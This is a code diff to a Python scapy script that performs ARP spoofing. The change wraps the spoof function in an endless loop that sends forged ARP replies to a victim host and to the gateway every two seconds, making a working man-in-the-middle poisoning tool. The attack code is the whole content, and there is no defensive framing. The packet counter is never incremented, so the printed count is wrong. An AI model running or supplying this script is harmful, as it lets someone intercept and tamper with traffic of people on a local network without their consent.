@@ -1,3 +1,4 @@
+import time
 import scapy.all as scapy
 
 
@@ -16,7 +17,14 @@ def spoof(target_ip: str, spoof_ip: str) -> None:
     target_mac = get_mac(target_ip) # getting a target mac addr using ip
     # creating fake arp packet
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet) # sending a packet
+    scapy.send(packet, verbose=False) # sending a packet
     
 
-spoof("192.168.12.102", "192.168.12.1")
+sent_packets_count = 0
+while True:
+    # sending arp packets to victim
+    spoof("192.168.12.102", "192.168.12.1")
+    # sending arp packets to gateway
+    spoof("192.168.12.1", "192.168.12.102")
+    print(f"[+] Packets Sent: {sent_packets_count}")
+    time.sleep(2)
